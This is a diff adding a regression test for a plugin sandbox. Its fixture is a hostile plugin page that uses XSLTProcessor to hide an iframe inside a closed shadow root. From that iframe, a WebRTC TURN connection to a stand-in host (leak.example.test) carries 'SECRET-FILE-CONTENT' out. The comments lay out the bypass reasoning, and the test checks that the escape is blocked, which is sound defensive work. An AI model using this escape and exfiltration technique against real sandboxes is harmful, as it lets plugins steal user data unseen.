@@ -608,6 +608,83 @@ const DOMPARSER_SHADOW_ATTACK_HTML = `<!doctype html>
 </html>`;
 
 /**
+ * Round 12. The same closed-shadow-root escape as `DOMPARSER_SHADOW_ATTACK_HTML`,
+ * through the one same-realm HTML *document* parser nothing denies:
+ * `XSLTProcessor.transformToDocument`.
+ *
+ * `document.write`, `document.writeln`, `Document.parseHTMLUnsafe`,
+ * `Element.setHTMLUnsafe` and `ShadowRoot.setHTMLUnsafe` are locked in
+ * `KILL_CHILD_REALMS`, and `DOMParser.parseFromString` was measured not to honour
+ * declarative shadow DOM. `XSLTProcessor` is in none of those lists. With
+ * `<xsl:output method="html"/>` Chromium builds the result tree through the HTML
+ * document parser with declarative shadow roots enabled, so
+ * `<template shadowrootmode="closed">` is consumed and becomes a real closed root
+ * on a document in this realm. No `attachShadow` call happens, so the wrapper
+ * never sees it and never forces `open`.
+ *
+ * `document.adoptNode` then *moves* the host into the live document; the closed
+ * root travels with it. `follow()` reads `element.shadowRoot`, which is `null`,
+ * the `MutationObserver` is never told about the inside of a shadow tree, and
+ * `querySelectorAll` does not cross the boundary — so the `<iframe>` in there
+ * connects to a browsing context that nothing in the shell can see, in a fresh
+ * realm with `RTCPeerConnection` intact.
+ *
+ * `xsl:attribute` rather than a literal `srcdoc="..."`: a literal attribute value
+ * in XSLT is an attribute value template, and the `{` of the ICE server
+ * dictionary would be parsed as an expression.
+ */
+const XSLT_SHADOW_ATTACK_HTML = `<!doctype html>
+<html>
+  <body>
+    <script>
+      var CHILD = "&lt;script&gt;var ice='no';try{var pc=new RTCPeerConnection(" +
+        "{iceServers:[{urls:'turn:leak.example.test:3478'," +
+        "username:'SECRET-FILE-CONTENT',credential:'x'}]});pc.createDataChannel('x');" +
+        "ice='gathering'}catch(e){ice='threw'}parent.parent.postMessage(" +
+        "{exfil:1,type:'child',tag:'xslt-adopt',rtc:typeof RTCPeerConnection,ice:ice},'*');&lt;/script&gt;";
+
+      var XSL =
+        '<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">' +
+        '<xsl:output method="html"/>' +
+        '<xsl:template match="/"><div id="dsdhost">' +
+        '<template shadowrootmode="closed">' +
+        '<iframe><xsl:attribute name="srcdoc">' + CHILD + '</xsl:attribute></iframe>' +
+        '</template></div></xsl:template></xsl:stylesheet>';
+
+      window.addEventListener("message", function (event) {
+        if (!event.data || event.data.exfil !== 1 || event.data.type !== "attack") return;
+
+        var notes = [];
+        try {
+          var processor = new XSLTProcessor();
+          processor.importStylesheet(new DOMParser().parseFromString(XSL, "text/xml"));
+          var out = processor.transformToDocument(new DOMParser().parseFromString("<a/>", "text/xml"));
+          var host = out && out.getElementById ? out.getElementById("dsdhost") : null;
+          if (!host) {
+            notes.push("nohost");
+          } else {
+            // A DSD-aware parse consumes the <template> and leaves a closed root,
+            // so the host has no children and no readable shadowRoot.
+            notes.push("kids=" + host.childNodes.length +
+              ";template=" + (host.querySelector("template") ? "kept" : "consumed") +
+              ";shadow=" + (host.shadowRoot ? "open" : "none"));
+            document.body.appendChild(document.adoptNode(host));
+          }
+        } catch (error) {
+          notes.push("threw:" + (error && error.message));
+        }
+
+        setTimeout(function () {
+          notes.push("hostConnected=" + document.querySelectorAll("#dsdhost").length);
+          window.parent.postMessage({ exfil: 1, type: "swept", note: notes.join(" ") }, "*");
+        }, 700);
+      });
+      window.parent.postMessage({ exfil: 1, type: "ready" }, "*");
+    </script>
+  </body>
+</html>`;
+
+/**
  * Round 11. `SELECTOR` in `KILL_CHILD_REALMS` and the markup sanitiser in
  * `INSERT_PLUGIN_HTML` both enumerate the elements that can become a browsing
  * context as `iframe,frame,object,embed,link`. On the Electron desktop build
@@ -1081,6 +1158,55 @@ describe("a hostile plugin", () => {
     expect(`${childReports.join(" ")} | ${note}`).toBe(
       " | adopt:kids=1;shadow=none import:kids=1;shadow=none",
     );
+  });
+
+  it("cannot get a closed shadow root out of XSLTProcessor", async () => {
+    const childReports: string[] = [];
+    let swept: string | null = null;
+    const onMessage = (event: MessageEvent) => {
+      const data = event.data as {
+        exfil?: number;
+        type?: string;
+        tag?: string;
+        ice?: string;
+        rtc?: string;
+        note?: string;
+      };
+      if (data?.exfil !== 1) {
+        return;
+      }
+      if (data.type === "child") {
+        childReports.push(`${data.tag}=rtc:${data.rtc};ice:${data.ice}`);
+      }
+      if (data.type === "swept") {
+        swept = data.note ?? "";
+      }
+      if (data.type === "ready") {
+        (event.source as Window | null)?.postMessage({ exfil: 1, type: "attack" }, "*");
+      }
+    };
+    window.addEventListener("message", onMessage);
+
+    const iframe = createPluginIframe(XSLT_SHADOW_ATTACK_HTML);
+    document.body.appendChild(iframe);
+    cleanups.push(() => {
+      window.removeEventListener("message", onMessage);
+      iframe.remove();
+    });
+
+    const note = await waitFor(() => swept, "the XSLT shadow attack to finish");
+
+    // Nothing may report from inside a child realm: that report is the escape.
+    // The note rides in the failure message so a red run says how far the attack
+    // got — whether the parse honoured declarative shadow DOM, and whether the
+    // host reached the live document.
+    //
+    // Asserted as absence rather than as one expected note, because there is more
+    // than one way to be safe here and the fix picked a different one than this
+    // test first assumed: `transformToDocument` and `transformToFragment` are
+    // denied outright, so the transform throws before there is a host to adopt.
+    expect(childReports, note).toEqual([]);
+    expect(note).toContain("hostConnected=0");
   });
 
   it("cannot get an Electron webview guest into the document", async () => {
